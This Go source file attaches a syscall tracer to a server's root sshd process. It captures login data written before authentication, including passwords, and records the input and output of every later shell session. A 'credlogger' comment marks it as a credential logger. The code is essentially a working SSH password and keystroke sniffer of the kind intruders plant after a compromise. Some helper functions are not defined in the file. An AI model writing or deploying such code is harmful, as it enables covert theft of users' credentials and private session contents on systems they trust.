package main

import (
	"encoding/binary"
	"fmt"
	"os"

	"./ghostrace/ghost"
	"./ghostrace/ghost/process"
	"./ghostrace/ghost/sys/call"
)

func run() error {
	// find sshd
	parentSshd, err := process.Filter(func(p process.Process) bool {
		if isSshd(p) {
			return isSshd(p) && !isSshd(p.Parent())
		}
		return false
	})
	if err != nil {
		return err
	}
	if len(parentSshd) != 1 {
		return fmt.Errorf("need (1) root sshd, found (%d)", len(parentSshd))
	}
	sshd := parentSshd[0].Pid()
	// initialize ghostrace
	tracer := ghost.NewTracer()
	trace, err := tracer.Trace(sshd)
	if err != nil {
		return err
	}
	fmt.Printf("[%d] attached to root sshd\n", sshd)
	tracer.ExecFilter(func(e *ghost.Event) (bool, bool) {
		c := e.Syscall.(*call.Execve)
		// sshd
		if strMatch(sshdPaths, c.Path) {
			return true, true
		}
		// bash
		if strMatch(shellPaths, c.Path) {
			if !strMatch(c.Argv, "-c") {
				parent := e.Process.Parent()
				if parent != nil {
					var login []string
					par2 := parent.Parent()
					if par2 != nil {
						p2proc := getProc(par2.Pid())
						login = p2proc.Login
					}
					proc := getProc(parent.Pid())
					proc.Shell = true
					// TODO: credlogger.log(login)
					proc.LogLogin(login)
				}
			}
			return true, false
		}
		// unknown process (like scp)
		return false, false
	})
	// loop until interrupted, or the target process exits (unlikely in the case of sshd)
	for event := range trace {
		pid := event.Process.Pid()
		proc := getProc(pid)
		if event.Exit && proc.Shell {
			proc.Exit()
			unlinkProc(pid)
			continue
		}
		var sc interface{} = event.Syscall
		if !proc.Shell {
			// preauth, look for login IO
			parent := event.Process.Parent()
			if parent != nil {
				pproc := getProc(parent.Pid())
				if sc, ok := sc.(*call.Write); ok {
					if sc.Fd == 4 && len(sc.Data) >= 6 {
						if int(binary.BigEndian.Uint32(sc.Data)) == len(sc.Data)-4 {
							pproc.LoginData(sc.Data[4:])
						}
					}
				}
			}
		} else {
			// postauth, pass all IO to be logged
			switch sc := sc.(type) {
			case *call.Read:
				if sc.Fd == 11 {
					proc.Stdout(sc.Data)
				}
			case *call.Write:
				if sc.Fd == 9 {
					proc.Stdin(sc.Data)
				}
			}
		}
	}
	return nil
}

func main() {
	if err := run(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
